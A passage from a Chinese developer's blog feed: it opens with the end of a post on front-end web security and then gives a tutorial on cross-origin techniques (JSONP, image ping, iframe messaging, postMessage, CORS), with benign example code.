<p>在 Web 开发中，应付 DDos 最常用的两个方式是验证码和访问频率控制：<br>验证码是判断请求是真实的用户发起的还是机器人自动生成的一个有效方法，因此可以过滤掉非正常用户的操作请求，从而节省服务器资源；<br>访问频率控制是指，跟踪同一个 IP 地址的用户在特定时间段内的请求次数，将其限制在合理的范围内，对超出该范围对请求予以忽略和等候提示，甚至对于长期拥有不合理请求规模对用户 IP 进行屏蔽处理。</p>
<p>但是现在的 DDos 攻击由于其性质的问题，实际上很难对其进行有效的判别，因此服务器抗压能力就有了很大的要求，一般使用反向代理配合分布式服务器增强集群对请求处理的能力，这也是大型互联网应用应对突发高并发请求的方法（如双十一抢购导致的合理的超大规模请求）</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实对于 Web 安全，前端方面可以做的事情并不是很多，有一段时间，知乎上关于前端到底要不要加密的讨论深深吸引了我（<a href="https://www.zhihu.com/question/25539382" target="_blank" rel="external">Web前端密码加密是否有意义？</a>）</p>
<p>我在开发主题基础时也曾经思考过，不过由于历史原因，并没有做任何的实践，而且全站启用 HTTPS 的情况下，也确实必要性不大。但是在最近做的一个微信应用时，还是把用户密码进行了 MD5 混淆再进行传送，虽然被劫持的可能性不大（有 HTTPS），但至少被劫持了也减少了撞库的可能性。</p>
<p>在安全方面，虽然主要还是后端做加密做数据库保护等等，但我觉得不应该把自己局限在前端开发这个位置，安全性应该是一个完整的系统，无分前后端，至少，了解主流 Web 安全防范也有利于自己视野的提升，对吧？</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近完成了一个关于店铺的评论插件，由于插件的特殊性质（见下图），在开发的过程中，或多或少地接触到了一些必要的安全防御手段。本来我对 web 的安全其实没有太多的研究，不过随着第二期迭代的完成，也确实意识到了自己在这方面的薄弱部分。好在项目有相当有经验的同事担当，因此开发中确实学到了很多，记录一下前端实际开发中遇到的安全问题和我个人的理解&lt;br&gt;&lt;img src=&quot;/images/我所理解的web安全-评价插件.png&quot; alt=&quot;我所理解的web安全-评价插件&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从 JSONP 开始跨域</title>
    <link href="https://github.com/Hyifu/2016/11/03/%E4%BB%8EJSONP%E5%BC%80%E5%A7%8B%E8%B7%A8%E5%9F%9F/"/>
    <id>https://github.com/Hyifu/2016/11/03/从JSONP开始跨域/</id>
    <published>2016-11-02T16:00:00.000Z</published>
    <updated>2017-05-01T02:17:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>跨域问题一直是困扰很多人的一个现实，我其实对这方面的很多细节也不了解，很多具体的实现仍然停留在前端的范畴内，至于后端的同学到底怎么配置的，一无所知。不得不说即便是前端开发，我觉得还是一样需要有那么一段时间接触一下后端实践，比如抽个一年半年的时间从事全职的后端开发，这对整个 Web 开发的体系会有一个更深层次的理解和延展。</p>
<p>但是事实也是，我毕竟还是致力于成为专业的前端开发，从前端的角度入手理解一下跨域的问题也是极好的。</p>
<a id="more"></a>
<h2 id="起航"><a href="#起航" class="headerlink" title="起航"></a>起航</h2><p>第一次接触跨域是从事全职前端的第二个月，当时一个客户希望改造他们的网店系统，新增一个销售员分级系统。后端直接采用 Node，前端则还是基于原先的店铺进行二次开发，那么数据并不在原先的店铺域名下，因此需要跨域抓取数据，由于只是展示的目的，因此采用了最兼容的 <code>JSONP</code></p>
<p>幼稚的我当时其实压根没想过 <code>JSONP</code> 后面的实现基础和原理，我只知道在当时的场景中，跨域非常好用，jQuery 封装好了简便的 API，我只需要调用就好了，反正就是把 <code>JSON</code> 包装起来传来传去罢了。</p>
<p>事实上，<code>JSONP</code> 跟 <code>JSON</code> 没有半毛钱关系，这让我想起一个比喻 —— JavaScript 是 Java 的蠢弟弟。望文生义往往是我致命的一个弱点，任何技术都是，在没有认真尝试和理解前，我都觉得要保持一种敬畏的态度。</p>
<h2 id="JSONP-系列"><a href="#JSONP-系列" class="headerlink" title="JSONP 系列"></a><code>JSONP</code> 系列</h2><p>跨域的第一个，也是最常用的，就是 <code>JSONP</code> 所采用的跨域原理，这里不只是 <code>JSONP</code>，而是一系列的跨域解决方案都是基于一个浏览器的“恩惠”：我允许你随便引进来某几种东西</p>
<p>我清楚地记得，在学习 <code>Bootstrap</code> 的时候，其中的 demo 代码我是可以直接复制到 HTML 中然后打开就可以复现了，我并没有下载他们的脚本和样式文件，因为每一个学习前端的人都知道，浏览器自己会跑到 <code>Bootstrap</code> 的网站引用这些（当然，现在我们知道这是 CDN，有其特殊的用处）—— 我很久以前，大学的时候就知道只要在网页中插入引用路径，不管是 JS，CSS，还是图片</p>
<p>因此可以给一个定义，凡是带有 <code>src</code> 这个属性的标签，其实都是不受同源策略的限制的</p>
<ul>
<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 外部 JS 引用</li>
<li><code>&lt;img src=“...”&gt;</code>，可以是 PNG，JPEG，GIF，BMP，SVG 等</li>
<li><code>&lt;iframe&gt;</code> 页面嵌套</li>
<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 外部 CSS 引用</li>
<li><code>&lt;video&gt;</code> 和 <code>&lt;audio&gt;</code> 嵌入多媒体资源</li>
<li><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code>的插件</li>
<li><code>@font-face</code> 一些浏览器允许跨域引入字体</li>
</ul>
<p>基于这类的跨域原理，一般我们只考虑用前三个（<code>&lt;script</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe</code>）实现跨域技术：因为这三个可以兼容老旧的浏览器，至于现代浏览器么，交给 CORS 是更明智的选择。</p>
<blockquote>
<p>基于 CSS 的跨域技术叫 <a href="https://github.com/zswang/csst">CSST（CSS Text Transformation）</a>，与其他跨域技术一样对低级浏览器兼容不好（需要支持 CSS3）</p>
</blockquote>
<h4 id="最兼容最常用的-JSONP"><a href="#最兼容最常用的-JSONP" class="headerlink" title="最兼容最常用的 JSONP"></a>最兼容最常用的 <code>JSONP</code></h4><p><code>JSONP</code> 是利用资源跨域允许的最常见技术，我们知道，在 HTML 中，脚本的执行一般是顺序的，也就是说后面 <code>&lt;script&gt;</code> 标签一般是在前面 <code>&lt;script&gt;</code> 标签执行完后再执行的，同时这些脚本间共享全局变量，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 第一个脚本 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="keyword">var</span> name = <span class="string">'hyifu'</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 第二个脚本 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="built_in">console</span>.log(name) <span class="comment">// 'hyifu'</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>第二个脚本可以获取到第一个脚本中的全局变量 <code>name</code> 并打印出它的值，就基于以上的规则，假如把第二个脚本换成外部脚本（里面的内容一致），那么实际上是会产生同样效果的。别忘了，外部脚本是不受同源限制的，这就是 JSONP 跨域的基本</p>
<p>那么具体是怎样实现的呢？考虑以下代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 第一个外部脚本来自当前域名 www.srcA.com</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span> (<span class="params">callbackData</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(callbackData.name)</div><div class="line">&#125;</div><div class="line"><span class="comment">// 第二个外部脚本来自其他域名 www.srcB.com</span></div><div class="line"><span class="keyword">var</span> data = &#123;</div><div class="line">  <span class="attr">name</span>: <span class="string">'hyifu'</span>,</div><div class="line">  <span class="attr">age</span>: <span class="number">27</span></div><div class="line">  job: <span class="string">'FrontEnd Engineer'</span></div><div class="line">&#125;</div><div class="line">jsonp(data)</div><div class="line"><span class="comment">// 毫无疑问，这里会得到 ‘hyifu’</span></div></pre></td></tr></table></figure></p>
<p>我们在第一个脚本中定义了一个函数，这个函数接受一个参数，调用这个函数会打印出参数中的一个属性值，我们在第二个脚本中直接传参调用了这个函数，于是打印出了我的名字缩写。不知道有没有注意到一个问题，第二个外部脚本是后面请求的，如果我们不是一开始就写好了这个脚本，它又是怎样知道这个函数名并且知道它需要怎样的参数呢？</p>
<p>继续往下挖掘，我们使用跨域技术，其实是希望能跟普通的 Ajax 请求一样，请求一个特定的网址并附上参数，就可以从服务器那边拿到想要的数据，因此 <code>srcB</code> 的服务器根本就不知道你想要执行的函数是什么。于是一个就需要一个通用的约定：请求脚本的时候，url 上带上参数，这个参数告诉了服务器 <code>srcA</code> 这个脚本定义的函数名字是什么，需要的数据又是什么，<code>srcB</code> 的服务器根据这些来动态生成脚本并返回。于是按照约定出现了以下代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 域名 srcA 的脚本</span></div><div class="line"><span class="keyword">var</span> srcB = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</div><div class="line">srcB.src = <span class="string">'www.srcB.com/script?callback=jsonp&amp;id=2017'</span></div><div class="line"><span class="built_in">document</span>.head.appendChild(srcB)</div></pre></td></tr></table></figure></p>
<p>这里动态生成一个 <code>&lt;script&gt;</code> 标签并插入到了页面 <code>&lt;head&gt;</code> 中，页面会立即向服务器请求这个脚本，注意到请求 url 中到这些参数：<code>?callback=jsonp&amp;id=2017</code>，<code>callback=jsonp</code> 告诉服务器你生成到代码要把参数传到这个函数中调用，<code>&amp;id=2017</code> 则告诉服务器需要作为参数传入到数据是 <code>id</code> 为 <code>2017</code> 的用户的资料，于是服务器动态生成了需要的脚本响应了浏览器的请求，于是 <code>srcA</code> 就打印出来了这个用户的资料！这就是 <code>JSONP</code> 的全部细节。</p>
<blockquote>
<p>实际上，插入后的脚本在代码执行后一般就再也没有用了，但它在 DOM 中依然可以被查看到，像 jQuery 这种类库会帮您在回调执行完以后删除这个标签<br>同时，如果基于团队开发，一个页面中可能用到非常多但 JSONP 请求，很难避免两个人同时使用一个回调的函数名称（但有时简便的实现是也可能后台写死了），这会导致冲突，因此类似 jQuery 这种类库会生成一个足够随机的回调函数名来实现，总之，如果要兼容老旧的浏览器，加入 jQuery 确实少了很多麻烦</p>
</blockquote>
<p>上面就是 <code>JSONP</code> 的技术实现和原理，其优点是非常简单易用，几乎兼容所有的浏览器实现跨域的双向信息交互<br>但是缺点也是明显的，通过请求脚本的方式注定了其只能支持 <code>GET</code> 请求，同时如果无法确定请求服务器是否安全的，在响应中有可能夹带恶意代码（XSS 攻击），最后是，无法判断请求是否失败（只能通过设置定时器来判断响应是否超时）</p>
<h4 id="广告商的最爱-Image-Ping"><a href="#广告商的最爱-Image-Ping" class="headerlink" title="广告商的最爱 Image Ping"></a>广告商的最爱 <code>Image Ping</code></h4><p>“图像Ping”，其实每天都活跃在我们的身边，每天我们打开的网页，有 90% 以上都使用到了这个技术<br>跟互联网的几乎所有的广告流量跟踪一样，我们在店铺的流量跟踪脚本 <code>tracker.js</code> 中也是利用了图片的跨域访问原理</p>
<blockquote>
<p>广告是网站盈利最重要的一个地方，那么就需要监听广告到底有多少个人看，于是就需要有一个服务器来统计这些流量来源</p>
</blockquote>
<p>假如你打开一个网页，里面有这么一段代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">“display:none”</span> <span class="attr">src</span>=<span class="string">"www.trace.com/image_ping?name=hyf"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>可以预见得到，你会向服务器 <code>www.trace.com</code> 发起一个图片的请求，这个请求 <code>url</code> 的参数传递了我的名字缩写<br>实际上，更常用更灵活的方法是使用脚本来进行这个操作，我们知道，在脚本中请求图片，即使并没有插入到 DOM 中（实际上使我们的 HTML 代码更干净），依然会触发网络请求，为后续可能的插入做好缓存。同时脚本中我们可以进行更多的操作（如服务器未响应可以考虑重新请求）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image()</div><div class="line">img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 如果服务器成功返回，则进入这里</span></div><div class="line">&#125;</div><div class="line">img.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 请求失败，考虑重新再次请求</span></div><div class="line">&#125;</div><div class="line">img.src = <span class="string">"www.trace.com/image_ping?name=hyf"</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>在单页 APP 中，这也常用来跟踪用户到底访问了哪个页面，每切换一次路由，就请求一次图像 Ping，参数附上当前所在页面</p>
</blockquote>
<p>在这里需要注意一下服务器常见的反应：服务器会接受到完整的请求，因此就获得来需要的查询信息（在这里是我的名字缩写，但其实可以用脚本传递几乎所有字符串，因此可能存在安全问题），一般服务器接到请求后会返回一个（1px x 1px）的透明图片，或者只返回 204 状态码</p>
<p>图像Ping 和 JSONP 一样都只能发送 GET 请求，而且只能单向通讯，只有服务器可以拿到浏览器给的数据</p>
<h2 id="iframe-系列"><a href="#iframe-系列" class="headerlink" title="iframe 系列"></a><code>iframe</code> 系列</h2><p>前面提到了 <code>iframe</code> 也可以跨域，但是并没有把它归并到 <code>JSONP</code> 一起讲解，这是因为 <code>iframe</code> 本质上并不能算是一种资源，而且其跨域的手段跟前面的资源类跨域实现也有很大区别。</p>
<p>跨文档消息传送（cross-document messaging），简称 XDM，主要是指一个页面通过某种技术手段与另外一个页面进行数据交互，一般说的这两个页面是跨域的，举例说，主页面需要向内嵌的 <code>iframe</code> 或者弹出的窗口传递信息<br>其技术基础一般有：</p>
<ul>
<li><code>document.domain</code></li>
<li><code>location.hash</code></li>
<li><code>window.name</code></li>
<li><code>postMessage()</code></li>
</ul>
<blockquote>
<p>我听说古老的 IE6 的存在一个 bug，父页面和子页面都可以访问 <code>window.navigator</code> 这个对象，通过在这个对象上添加属性或方法，就可以达到共享数据啦（然并卵，谁会这么做呢？）</p>
</blockquote>
<p>其中，前三种都是基于 <code>&lt;iframe</code> 标签进行的兼容性实现，而 <code>postMessage()</code> 实际上是 XDM 的规范化实现</p>
<h4 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a><code>document.domain</code></h4><p>比较常用的跨域方法，但限制是，只能用于同一个主域下不同子域之间，比如 <code>foo.com</code> 与 <code>img.foo.com</code>，或者 <code>img.bar.com</code> 与 <code>mp3.bar.com</code>，但是如果用在 <code>foo.com</code> 与 <code>baz.com</code> 之间则会失败<br>下面的代码清晰地展示了这个机制的应用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- foo.com --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://img.foo.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="comment">// 指向主域名</span></div><div class="line"><span class="built_in">document</span>.domain = <span class="string">'foo.com'</span></div><div class="line"><span class="comment">// 定义于父级文档的函数 fnSuper</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fnSuper</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'父函数说：'</span> + str)</div><div class="line">&#125;</div><div class="line"><span class="comment">// 当 `iframe` 完成加载时尝试调用子文档定义的函数 fnSub</span></div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>)</div><div class="line">  iframe.contentWindow.fnSub(<span class="string">'父级'</span>) <span class="comment">// '子函数说：父级'</span></div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- img.foo.com --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="comment">// 指向主域名</span></div><div class="line"><span class="built_in">document</span>.domain = <span class="string">'foo.com'</span></div><div class="line"><span class="comment">// 定义子文档的一个函数 fnSub</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fnSub</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'子函数说：'</span> + str)</div><div class="line">&#125;</div><div class="line">parent.fnSuper(<span class="string">'子级'</span>) <span class="comment">// '父函数说：子级'</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a><code>location.hash</code></h4><p>这个方法是利用了同域名的子 iframe 是可以通过 <code>top</code> 或者 <code>parents</code> 来拿到父框架的引用的原理（及作为通讯的中转，hash 一般是在中转页面中处理）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- foo.com --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframeFoo"</span> <span class="attr">src</span>=<span class="string">"http://bar.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">callback</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(data)</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- bar.com --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> bus = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>)</div><div class="line">  <span class="keyword">var</span> name = <span class="string">'我来自域名 Bar'</span></div><div class="line">  <span class="comment">// 打开 foo 域名下的一个中转页面，其路径 `hash` 上放入要传递的数据</span></div><div class="line">  bus.src = <span class="string">'http://foo.com/bus.html#'</span> + name</div><div class="line">  <span class="built_in">document</span>.body.appendChild(iframe)</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- foo.com/bus.html --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(location.hash.substr(<span class="number">1</span>)) <span class="comment">// 处理数据，得到 ‘我来自域名 Bar’</span></div><div class="line">  <span class="comment">// top 指向父页面 foo.com，因此可以调用 foo 中定义的 callback 函数（也可以手动 parent 指定具体的父页面）</span></div><div class="line">  top.callback(data) <span class="comment">// 最终数据作为参数传入了指定的函数并调用</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这个方法实现起来相对繁琐，同时跨域的数据都需要暴露在 URL 中，由于 URL 的长度一般有所限制，导致传送的数据量也相对有限（只能传可 JSON 化的数据）</p>
<h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a><code>window.name</code></h4><p>在同一个浏览器中（同一个窗口同一个标签页），<code>window.name</code> 可以在不同页面加载后依然保持，举例说：打开了 <code>www.baidu.com</code>这个页面，在控制台中输入 <code>window.name = &#39;test&#39;</code>，然后在地址栏输入 <code>www.qq.com</code>，然后再次查看 <code>window.name</code> 会发现其值依然保持为 <code>test</code>，利用这种特性就可以在嵌套的页面中进行数据传送</p>
<div class="tip"><br>写作这篇时，我的 Safari 浏览器测试不到这个实现，建议放弃使用这个方法，因此也不过多进行赘述<br></div>

<h4 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage()"></a><code>postMessage()</code></h4><p>前面所说的页面间的通讯方法，实现起来既麻烦又容易出错，还有各种限制，因此如果不需要兼容 IE8 以下的浏览器，我们迎来了一个归一的替换方法：<code>postMessage(message, url)</code>，这个方法第一个参数是希望传递的数据，第二个参数则一般是一个 url，指定接受数据的源，只有源匹配才能成功通讯（可以指定为 <code>*</code> 允许所有源）</p>
<p>以上是发送信息，接受信息是以异步事件的形式完成的，以下是一个简单的应用：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- foo.html --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"myframe"</span> <span class="attr">src</span>=<span class="string">"bar.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"button"</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="keyword">var</span> iframeWindow = <span class="built_in">document</span>.getElementById(<span class="string">'myframe'</span>).contentWindow</div><div class="line">  <span class="built_in">document</span>.getElementsByTagName(<span class="string">'button'</span>)[<span class="number">0</span>].addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    iframeWindow.postMessage(<span class="string">'A Click'</span>, <span class="string">'*'</span>)</div><div class="line">  &#125;)</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- bar.html --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(event.data) <span class="comment">// 传递的数据</span></div><div class="line">    <span class="built_in">console</span>.log(event.source) <span class="comment">// 发送消息的窗口对象</span></div><div class="line">    <span class="built_in">console</span>.log(event.origin) <span class="comment">// 发送消息窗口的源（协议+主机+端口号）</span></div><div class="line">  &#125;)</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>点击父框架 <code>foo</code> 的按钮会向子框架传递一个字符串，子框架通过监听事件的方式可以接收到这个不限制接收源的信息</p>
<p>可以看到，相比于前面定义的其他框架间跨域通讯方法，<code>postMessage</code> 方法的使用清晰了很多，跟我们定义一个 DOM 事件并无太大的区别，而且本方法兼容 IE8，可以说在现今这个甚至可以抛弃 IE8 的大环境下，框架间的通讯完全可以只考虑 <code>postMessage</code></p>
<h2 id="CORS-系列"><a href="#CORS-系列" class="headerlink" title="CORS 系列"></a><code>CORS</code> 系列</h2><p>总算进入现代浏览器的范畴了，经历了前面那么多曲折的 <code>Ajax</code> 跨域实现，我们是多么希望这个同源策略可以在安全的范围内有所打破！</p>
<p><code>CORS</code> 是一个 W3C 标准，全称是”跨域资源共享”（Cross-Origin Resource Sharing），主要针对 Ajax 跨域，需要浏览器和服务器同时支持。一般而言，<code>CORS</code> 与同源的 Ajax 在前端开发者和用户体验上并没有什么区别，支持的浏览器会自动在请求头部加上特殊的头信息，因此，该技术在开发中关键在意服务器的配置（当然，一般只需要注意 IE8 和 IE9 并没有原生实现，需要通过兼容的版本 XDR），根据不同的请求在服务器中设置 <code>Access-Control- Allow-Origin</code> 并予以回应</p>
<p>对于本技术原理的详尽解析，建议参考阮一峰的博客：<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a>，这里我只讲解浏览器中的具体实现和兼容</p>
<ul>
<li><p>原生的 <code>CORS</code> 标准实现中，在前端代码层面上跟写普通的 XHR 没有任何区别，不过考虑安全，有一些限制</p>
<ul>
<li>不能使用 <code>setRequestHeader()</code> 自定义请求头部</li>
<li>不会携带 <code>cookie</code></li>
<li>调用 <code>getAllResponseHeaders()</code> 总是返回空字符串（无效化）</li>
</ul>
</li>
<li><p>IE 中的实现，同样也有一些限制</p>
<ul>
<li>不会携带 <code>cookie</code></li>
<li>只能设置头部的 <code>Content-Type</code></li>
<li>不能访问响应的头部</li>
<li>只支持 <code>GET</code> 和 <code>POST</code></li>
</ul>
</li>
</ul>
<p>XDR 也跟 XHR 很类似，如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xdr = <span class="keyword">new</span> XDomainRequest() <span class="comment">// 创建独有的 XDomainRequest 对象</span></div><div class="line">xdr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="comment">// 这里只能访问响应的原始文本，而没发读取到响应状态</span></div><div class="line">  alert(xdr.responseText)</div><div class="line">&#125;</div><div class="line">xdr.open(<span class="string">'get'</span>, <span class="string">'http://www.somewhere-else.com'</span>)</div><div class="line">xdr.send(<span class="literal">null</span>)</div></pre></td></tr></table></figure></p>
<h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>前面介绍了很多跨域的实现，基本上都是假定浏览器会遵循同源策略，所以是以绕过同源限制的方法去考虑一些问题。但我有时想，能不能打破这个限制呢？其实是有的，还很多</p>
<p>你一定觉得很搞笑，同源策略是浏览器最基本的安全实现，怎么可能不遵守呢？</p>
<p>没错，浏览器一定会遵守同源策略，但是我们可以给浏览器一个“代理”，这个代理并不是浏览器，它可能就没有同源限制。<br>实际上，最简单的跨域实现是，让你的同源服务器代你跨域拿取数据！我们一直忽略了这一点：跟自己的服务器之间一直是同源的。</p>
<p>基于这个思路，其实就有很多这样的代理实现：臭名昭著的 <code>Flash</code>，各种浏览器控件，浏览器给了它们信任的接口，但它们自己却没有同源策略的限制。方法虽好，但随之带来的是安全性的下降，用户体验的缺失（浏览你的网站还需要特定的插件，想想就不好了），因此这些方法也即将随着现代浏览器的快速更新和普及而消亡……</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跨域问题一直是困扰很多人的一个现实，我其实对这方面的很多细节也不了解，很多具体的实现仍然停留在前端的范畴内，至于后端的同学到底怎么配置的，一无所知。不得不说即便是前端开发，我觉得还是一样需要有那么一段时间接触一下后端实践，比如抽个一年半年的时间从事全职的后端开发，这对整个 Web 开发的体系会有一个更深层次的理解和延展。&lt;/p&gt;
&lt;p&gt;但是事实也是，我毕竟还是致力于成为专业的前端开发，从前端的角度入手理解一下跨域的问题也是极好的。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>半个像素的情怀</title>
    <link href="https://github.com/Hyifu/2016/08/19/%E5%8D%8A%E4%B8%AA%E5%83%8F%E7%B4%A0%E7%9A%84%E6%83%85%E6%80%80/"/>
    <id>https://github.com/Hyifu/2016/08/19/半个像素的情怀/</id>
    <published>2016-08-18T16:00:00.000Z</published>
    <updated>2017-05-01T02:16:28.000Z</updated>
    
